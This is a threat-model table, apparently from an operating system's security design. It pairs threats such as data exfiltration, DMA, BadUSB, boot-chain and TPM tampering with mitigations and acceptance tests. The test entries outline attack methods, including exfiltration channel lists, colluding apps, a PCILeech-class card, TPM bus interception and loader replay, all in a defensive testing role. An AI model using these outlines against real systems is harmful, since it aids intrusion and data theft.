| A3 → screen, input, mic, camera | grants only through portals; prompts drawn by the compositor; keyboard and pointer emulation only to the focused surface behind a grant | prompt-spoofing test against the compositor; an app can't read another window's pixels or keys, and an app holding the virtual-input grant reaches only the focused surface (7) |
| A3 → exfiltration | files + network is one explicit grant; per-identity egress filter; secrets used through agents; networked deputies check grants; direct channels checked transitively as one principal; the overt channels are the closed list in `design/channels.toml` | **exfiltration suite**: a canary file in a granted folder and a canary SSH key; an app (and a script run from the terminal) without the combined grant tries every overt channel (sockets of every family, loopback to another identity's port, io_uring socket ops, every portal, open-URI, clipboard, D-Bus, DNS lookups through the resolver, notifications, launching a networked app); the canary must not reach an external sink (6 for sockets, 5 for portals and open-URI). In full it adds **colluding apps**: two, one holding the folder and one holding network, and a chain of three (files, nothing, network), which try every channel in `design/channels.toml` between them, including relays through PipeWire and D-Bus, a granted loopback port, a shared writable folder, drag and drop, and the grants given to the networked one at run time; covert-channel bandwidth is measured and published (7) |
| A3 → side channels | the mitigation matrix, SMT off on affected CPUs | the PoC suite recovers zero secret bytes above chance on the shipped default for each CPU model, and app to app with opt-in SMT on (3) |
| A4 → signed malicious update | offline root, threshold signing, transparency log with witnessed checkpoints, reproducible builds | an unlogged but validly signed release is refused; a stale-metadata mirror is detected within 24 h (7; signing design from 4b) |
| A4 → poisoned dependency | pinned hashes, cargo-vet, cargo-deny | CI fails on an unpinned fetch or unvetted crate (1) |
| A5 → DMA attack | IOMMU deny-all (every unused AMD-Vi device table entry and Intel context entry blocking), per-device domains, ATS off by default, interrupt remapping; DMA is stopped by bridge or root-port BME plus the IOMMU, never by a device's own BME; pre-boot protection or Optimal Boot's deny-all IOMMU covers the hand-off | our vfio-user hostile device server on the pinned QEMU sends DMA and MSI writes outside its domain and from an unassigned requester ID; all fault and are logged (1c); a PCILeech-class FPGA card on a D1 reference machine with pre-boot DMA protection reads and writes nothing outside its domain, across the firmware-to-kernel hand-off too, and its spoofed requester IDs and ACS-bypass attempts fail (4a) |
| A5 → BadUSB | per-interface authorisation; typed confirmation for HID | an emulated keyboard that types at once gets no keystroke accepted; a composite device's hidden HID is held (6) |
| A5 → malformed descriptors | HID and class drivers in tier 3, one HID process per device, fuzzed | descriptor and report-descriptor fuzzing 24 h clean (6) |
| A6 → read the disk | encryption ([storage.md](storage.md)); core-crypto proof target 14 | an offline disk image shows only ciphertext and the documented plaintext metadata; target 14 at T (4a) |
| A6 → tamper with the boot chain | Secure Boot, signed config, measured boot, signed TPM policy over PCR 4, 7, 8, 9; floor state machine proof target 16 | tamper tests in [boot.md](boot.md), including an older signed loader, a signed tool replaying the event log and a config signed by a revoked key; target 16 at B (4b) |
| A6 → substituted volume | before capping only the fixed-format Optimal header block is parsed, its volume tag checked over the raw bytes before any JSON; the service-key secret is released only after the tag matches | a volume with a hostile header and JSON area, swapped in for the real one, gets no secret and no counter bump; the pre-cap parser fuzzed to the in-kernel thresholds (4b) |
| A6 → clear the TPM to reset the floor | the SRK name and the base-index name are recorded in loader state and the header; if either changed, the loader boots only the highest-SVN image present and warns; the loader disables an open platform hierarchy before `ExitBootServices` | clear the TPM, redefine the indices, then try to boot an older slot; it is refused with a warning (4b) |
| A6 → tamper with ciphertext | stage 1: metadata checksums plus hardened parsing; stage 2: authenticated encryption | random and replayed sector writes to an encrypted ext4 image never crash or corrupt the kernel (4a); bit flips detected in stage 2 (file system track) |
| A6 → TPM bus | salted, parameter-encrypted sessions bound to the SRK recorded at first sealing; PIN stretched and mixed into the key; the service-key secret also needs the PIN (`TPM2_PolicyAuthValue`) | swtpm traffic contains no key bytes; a swtpm man-in-the-middle proxy fails to unseal the disk secret or the service-key secret without the PIN (4b) |
| A6 → TPM reset or lost state on resume | a PCR reset while running is treated as tamper; the resume object is bound to this boot's capped PCR 8 and 9 values, which a TPM reset destroys | resume after a forced TPM reset can't use the resume object, falls to recovery (passphrase or recovery key) and logs tamper (10) |
| A6 → guess the PIN | TPM dictionary-attack lockout with owner and lockout authorisation set at install | lockout engages after 32 tries; root can't reset it (4b) |
| A6 → locked or suspended laptop | protected-class keys and page cache evicted on lock; in stage 1, suspend wraps the volume key and the service-key secret into a resume object (this boot's capped PCR 8 and 9 plus the stretched PIN), then wipes them and the home keys | after suspend, a memory scan finds no volume key, home key or service-key secret, and resume asks for the PIN (10); after lock, a memory scan finds no protected-class key and no plaintext canary from protected files (file system track; until stage 2 the scorecard shows promise 4 as "partial") |
| A6 → hibernation image | class-C keys evicted before hibernating; per-boot image key sealed with the full disk policy plus the PIN | the image holds no class-C key or canary; resume without the PIN, with tampered PCRs, or with an image below the rollback floor is refused (10) |
| A7 → other user's data | per-user keys (stage 1: per-user encryption of home directories; stage 2: in the file system), per-user file trees, limited administrators | a second user, including an administrator, can't read the first user's files or reset their way in (5); on B1 a second user logs in after PCR capping (5, run once 4b is done) |
| A7 → kernel crash dumps | kernel memory only by default, encrypted to administrators, user pages only with each user's consent | the crash-dump canary test under "Crash reports stay local" (5) |
| Promise 3 → telemetry | nothing phones home | a fresh install left idle 24 h contacts only the update and time hosts, all logged (7) |
